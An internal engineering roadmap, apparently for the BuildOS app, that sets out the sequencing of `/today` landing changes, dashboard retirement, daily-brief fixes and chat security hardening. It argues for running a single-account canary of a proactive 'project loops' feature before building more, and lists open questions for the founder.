**Strategic read:** the single highest-leverage move is **not code — it's turning it on for one account and watching.** This system has been engineered to a high standard for a hypothesis that has never been tested: _do users want proactive project reconciliation at all?_ Every strategic question (noise vs value, cost vs benefit, proactive-loop vs on-demand "review my project" chat — **which is already built**) is downstream of one canary run. If the canary shows suggestions feel like nagging, the honest move may be to expose these generators as a manual chat capability and retire the autonomous triggers — keeping the safety/dedup work, dropping the scheduler/burst/debounce complexity. A proactive loop dumping suggestions into a shared, ungrouped AI Inbox is the most likely path to this feature feeling like clutter rather than relief — which cuts directly against BuildOS's "lead with relief" positioning. **Ship the canary before writing another line of loop code.**

---

## Recommended sequence

The surfaces strategy pass produced a concrete, dependency-ordered plan. Consolidated with the systems findings. **Reordered 2026-07-12** per DJ's concern that new/sparse users shouldn't be dropped onto an empty `/today` — the readiness state now precedes the redirect flip (fix the destination before sending everyone to it):

0. **Make `/today` readiness-aware** (M, **do first**) — render a getting-started first-run state for zero/sparse-project users instead of the bare "Clear day ahead" (`today/+page.svelte:238,871-891`), and stop hiding undated `todo` tasks (the agenda only pulls due-today/starts-today/`in_progress`, so a new project of undated tasks shows an empty day — `today-feed.service.ts:110-132`). `feed.projectNames` already carries the project count for the branch. → **tasker/27 WP-0**
1. **Guard the landing** (S) — onboarding-completion check on the `/`→`/today` flip; add `/today` + `/` to `shouldLoadOnboardingProgress`. → **tasker/27 WP-2**
2. **Finish the redirect flip** (S, AFTER 0+1) — repoint auth-funnel _defaults_ to `/today` (`login/+page.server.ts:9`, `register/+page.server.ts:9`, `onboarding/+page.server.ts:54`, `login/+page.svelte:207`, both OAuth `successPath`s, logo `Navigation.svelte:787`), preserving invite/redirect targets. → **tasker/27 WP-1**
3. **Fix the daily-brief opt-in + default** (S–M) — idempotent upsert of brief prefs; set `emailEnabled` only after 2xx; default-on or pre-generate first brief. → **tasker/27**
4. ~~**Apply migration `20260706020000` to prod**~~ ✅ **DONE 2026-07-12 (DJ)** — anon-readable metrics view closed. Left: drop the temporary `as any` casts after `pnpm gen:all`.
5. **Ship S2 image-exfiltration fix** (S) — restrict chat sanitizer `img src` to same-origin/data: or add a chat CSP `img-src`. Cheapest security win. → chat Wave 3 (tasker/20)
6. **Promote the calendar to `/calendar`** (M) — the real `/dashboard` phase-out blocker; scope first. → **tasker/27**
7. **Remove "Dashboard" nav tab + repoint logo** (S), keep `/dashboard` reachable by redirect; then delete `AnalyticsDashboard`, `dashboard.css`, `DashboardBriefWidget`, and the 340-line legacy fallback once calendar/invites/activity/chats/brief homes are confirmed. → **tasker/27**
8. **Resolve the `/briefs` orphan** (S–M) — fold into `/today` or make canonical + link it; point `BriefStatusIndicator` at the winner. → **tasker/27**
9. **`/history` fail-loud** (S) — rethrow so RPC failure surfaces instead of a silent empty archive. → **tasker/27**
10. **`/projects` scale + declutter** (M) — pass `p_limit` + load-more/virtualization; extract admin graph to `/admin`; delete `/projects/create` wrapper; remove `/projects/[id]/old`. → **tasker/27**
11. **Chat Wave 3 security** (L) — unify interactive-chat writes onto the ChangeSet staging path (S1/S3); add untrusted-content wrapper on the worker transcript (S14); add an `agent_runs` stalled-run sweeper (NEW). → tasker/20
12. **Brief → `/today` reconciliation** (M) — point brief CTA + `ensure-today` at `/today`; add reachability gate; split stored-brief from delivered-digest (WP-7/11); add a generation-health admin card. → daily-brief follow-ups
13. **Chat-frontend hygiene** (S–M) — add a retry affordance to the terminal stream-error banner (biggest UX gap, one-affordance fix); land the deferred `#finishRun()` consolidation before the next stream-lifecycle change. → chat follow-ups
14. **Unify the create metaphor** (L, lower urgency) — one canonical braindump→project flow reused across onboarding, `/today`, and `/projects`.

### Separate track — project loops: validate before building

Project loops is production-grade code that has **never run for a real user**. Do not add more loop surface; run a canary. Concrete pre-enable checklist (from the loops audit):

1. Confirm **all six migrations** applied to prod: `20260703000000`, `20260703010000`, `20260704000000`, **plus the two newer `20260707050000` (review_signals) and `20260707060000` (audit_inbox_source)** the 7/04 checklist doesn't track. Flipping the flags without the 0707 pair = immediate 500s.
2. **Add a global daily spend/volume ceiling** (or per-user cap) with an automatic pause — today the only guard is a soft per-run $0.35 cap and the flag is the only kill switch.
3. Enable both flags (`PUBLIC_ENABLE_PROJECT_LOOPS` in Vercel, `ENABLE_PROJECT_LOOPS` in Railway) **for DJ's account or one canary project only**; run the 7/04 manual validation sequence; watch cost + suggestion quality for a week.
4. Run `pnpm gen:types` post-migration and drop the `(admin as any)` casts on the review-signal path.
5. Refresh the stale 7/04 audit doc (Tier 1 committed, Tier 2 timezone/fan-out done, debounce layer added; open = #9 + cost ceiling + task-conflict resolution actions).

If the canary shows suggestions read as nagging, the honest move is to expose these generators as a **manual "review my project" chat capability** (retiring the autonomous scheduler/burst/debounce triggers) rather than shipping proactive noise into a shared inbox.

**User-facing risk to manage:** flipping auth to `/today` changes where every returning user lands — **sequence the calendar promotion (6) before removing the Dashboard tab (7)** or power users lose calendar access. Ensure `/today` handles zero-project and mid-onboarding gracefully before the flip. Keep `/old` and `/dashboard` as redirect-only (not hard-deleted) until v2 and `/today` are trusted in prod.

---

## Open questions for the founder

These recurred across agents and need a product/ops decision, not more code reading:

1. **Is `/today` intended to fully replace `/dashboard`, or coexist as "quick agenda" vs "full overview"?** The `/today` "Full dashboard" link suggests intentional coexistence, which contradicts the retirement framing. This one answer unblocks steps 1, 6, 7.
2. **Is the daily brief opt-in for privacy/cost reasons, or is defaulting-off just untuned?** Gates the retention fix.
3. ~~Has migration `20260706020000` been applied to prod?~~ ✅ Applied 2026-07-12 (DJ).
4. **Is `ENGAGEMENT_BACKOFF_ENABLED` currently true in Railway?** Determines whether re-engagement is spending LLM budget on unreachable users right now.
5. **What actually writes `onto_braindumps` at runtime?** Determines whether `/history`'s "Captures" tab is live or legacy.
6. **Is the guided-chat `project_create` flow measurably better than braindump capture, or is the fork historical?** Gates the create-metaphor unification.
7. **What's the real usage split between the v2 workspace and the `/old` classic view?** If `/old` is <1% of opens, deletion is a no-brainer.
8. **Are both flags (`PUBLIC_ENABLE_PROJECT_LOOPS`, `ENABLE_PROJECT_LOOPS`) actually off in prod, and are all six loop migrations applied?** Determines whether the loops canary is one config flip away or blocked on migrations.
9. **`FASTCHAT_INITIAL_PLAN_MODEL_TIERING` in Vercel prod — on or off?** The single "zero-code" latency lever; the code default is off.
